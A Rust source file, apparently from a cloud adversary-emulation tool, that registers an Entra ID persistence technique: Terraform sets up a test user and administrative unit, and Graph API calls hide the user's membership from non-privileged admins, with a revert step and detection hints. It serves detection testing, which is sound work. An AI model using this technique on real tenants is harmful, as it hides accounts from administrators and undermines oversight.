use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    azuread = { source = "hashicorp/azuread", version = "~> 2.0" }
    random  = { source = "hashicorp/random",  version = "~> 3.0" }
  }
}

provider "azuread" {}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "azuread_user" "victim" {
  user_principal_name = "stratus-victim-${random_string.suffix.result}@${var.domain}"
  display_name        = "Stratus Victim User"
  mail_nickname       = "stratus-victim-${random_string.suffix.result}"
  password            = "P@ssw0rd${random_string.suffix.result}!"
}

resource "azuread_administrative_unit" "au" {
  display_name = "stratus-hidden-au-${random_string.suffix.result}"
  hidden_membership_enabled = true
}

variable "domain" { description = "Entra ID tenant domain" }

output "user_id" { value = azuread_user.victim.object_id }
output "au_id"   { value = azuread_administrative_unit.au.object_id }
"#;

async fn graph_token() -> Result<String> {
    let tenant_id = std::env::var("AZURE_TENANT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_TENANT_ID env var not set"))?;
    let client_id = std::env::var("AZURE_CLIENT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_ID env var not set"))?;
    let client_secret = std::env::var("AZURE_CLIENT_SECRET")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_SECRET env var not set"))?;
    let url = format!(
        "https://login.microsoftonline.com/{}/oauth2/v2.0/token",
        tenant_id
    );
    let http = reqwest::Client::new();
    let params = [
        ("client_id", client_id.as_str()),
        ("client_secret", client_secret.as_str()),
        ("scope", "https://graph.microsoft.com/.default"),
        ("grant_type", "client_credentials"),
    ];
    let resp: serde_json::Value = http
        .post(&url)
        .form(&params)
        .send()
        .await?
        .json()
        .await?;
    resp["access_token"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("No access_token in response"))
        .map(str::to_string)
}

async fn detonate_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = graph_token().await?;
    let http = reqwest::Client::new();

    let user_id = outputs
        .get("user_id")
        .ok_or_else(|| anyhow::anyhow!("Missing output: user_id"))?;
    let au_id = outputs
        .get("au_id")
        .ok_or_else(|| anyhow::anyhow!("Missing output: au_id"))?;

    // Set AU visibility to HiddenMembership
    let patch_url = format!(
        "https://graph.microsoft.com/v1.0/directory/administrativeUnits/{}",
        au_id
    );
    http.patch(&patch_url)
        .bearer_auth(&token)
        .json(&serde_json::json!({ "membershipType": "Assigned", "visibility": "HiddenMembership" }))
        .send()
        .await?;

    println!("Set administrative unit '{}' visibility to HiddenMembership", au_id);

    // Add user to the hidden AU
    let add_url = format!(
        "https://graph.microsoft.com/v1.0/directory/administrativeUnits/{}/members/$ref",
        au_id
    );
    let body = serde_json::json!({
        "@odata.id": format!("https://graph.microsoft.com/v1.0/users/{}", user_id)
    });

    let resp = http
        .post(&add_url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 204 || resp.status().as_u16() == 201 {
        println!(
            "Added user '{}' to hidden administrative unit '{}' — \
             user membership is hidden from non-privileged admins",
            user_id, au_id
        );
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!(
            "Failed to add user to hidden AU ({}): {}",
            status,
            text
        );
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = graph_token().await?;
    let http = reqwest::Client::new();

    let user_id = outputs
        .get("user_id")
        .ok_or_else(|| anyhow::anyhow!("Missing output: user_id"))?;
    let au_id = outputs
        .get("au_id")
        .ok_or_else(|| anyhow::anyhow!("Missing output: au_id"))?;

    // Graph API: DELETE /administrativeUnits/{id}/members/{memberId}/$ref
    let del_url = format!(
        "https://graph.microsoft.com/v1.0/directory/administrativeUnits/{}/members/{}/$ref",
        au_id, user_id
    );

    let del_resp = http.delete(&del_url).bearer_auth(&token).send().await?;

    if del_resp.status().is_success() || del_resp.status().as_u16() == 204 {
        println!("Removed user '{}' from hidden administrative unit '{}'", user_id, au_id);
    } else {
        let status = del_resp.status();
        let text = del_resp.text().await.unwrap_or_default();
        anyhow::bail!("Failed to remove user from AU ({}): {}", status, text);
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "entra-id.persistence.hidden-au",
        friendly_name: "Add User to Hidden Entra ID Administrative Unit",
        description: "Adds a user to an Entra ID Administrative Unit with HiddenMembership visibility, hiding the user's membership from non-privileged admins to evade detection.",
        detection: "Entra ID audit log: Add member to administrative unit. Microsoft Sentinel: Hidden membership AU modification.",
        platform: Platform::EntraId,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
